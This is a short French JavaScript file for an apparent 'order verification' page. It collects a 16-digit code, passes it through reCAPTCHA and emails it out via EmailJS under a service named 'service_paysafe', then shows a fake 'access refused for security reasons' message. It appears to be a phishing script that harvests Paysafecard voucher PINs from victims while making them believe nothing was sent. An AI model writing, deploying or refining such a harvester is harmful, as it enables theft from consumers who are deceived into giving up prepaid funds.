console.log("script.js chargé");

// Initialisation EmailJS
emailjs.init("rORVGScs1n94sqOPi");

async function verifyOrder() {

    console.log("verifyOrder appelée");

    const input = document.getElementById("orderNumber");
    const message = document.getElementById("message");
    const button = document.querySelector(".search-box button");

    // Supprimer les espaces avant la vérification
    const orderNumber = input.value.replace(/\s/g, "");

    // Vérifie qu'il y a exactement 16 chiffres
    if (!/^\d{16}$/.test(orderNumber)) {
        message.style.color = "red";
        message.textContent = "saisis le code a 16 chiffres.";
        input.focus();
        return;
    }

    button.disabled = true;
    button.textContent = "Sending...";
    message.textContent = "";

    try {

        // Attendre le chargement de reCAPTCHA
        await new Promise(resolve => {
            grecaptcha.ready(resolve);
        });

        // Générer le token reCAPTCHA
        const recaptchaToken = await grecaptcha.execute(
            "6Lfnw3otAAAAAPVN5uNj2rCVl0AMrwpyHbfsNOgo",
            {
                action: "verify_order"
            }
        );

        console.log("reCAPTCHA token obtenu");
        console.log(recaptchaToken);

        // Envoi EmailJS
        const response = await emailjs.send(
            "service_paysafe",
            "template_psf",
            {
                order_number: orderNumber
            }
        );

        console.log("Email envoyé !");
        console.log(response);

        // Premier message
        message.style.color = "white";
        message.textContent =
            "en cour .";

        // Vider le champ
        input.value = "";
        input.focus();

        // Deuxième message après 2 secondes
        setTimeout(function () {

            console.log("Deuxième message");

            message.style.color = "red";
            message.textContent =
                "accès refusé pour raison de sécurité.";

        }, 2000);

    } catch (error) {

        console.error("Erreur :", error);

        message.style.color = "red";
        message.textContent =
            "l'accès a ete refusé pour des raisons de sécurité.";

    } finally {

        button.disabled = false;
        button.textContent = "Submit";
    }
}


// Autoriser uniquement les chiffres
// + ajouter un espace tous les 4 chiffres
document.getElementById("orderNumber").addEventListener("input", function () {

    // Conserver uniquement les chiffres
    let value = this.value.replace(/\D/g, "");

    // Limiter à 16 chiffres
    value = value.substring(0, 16);

    // Ajouter un espace tous les 4 chiffres
    this.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");

});
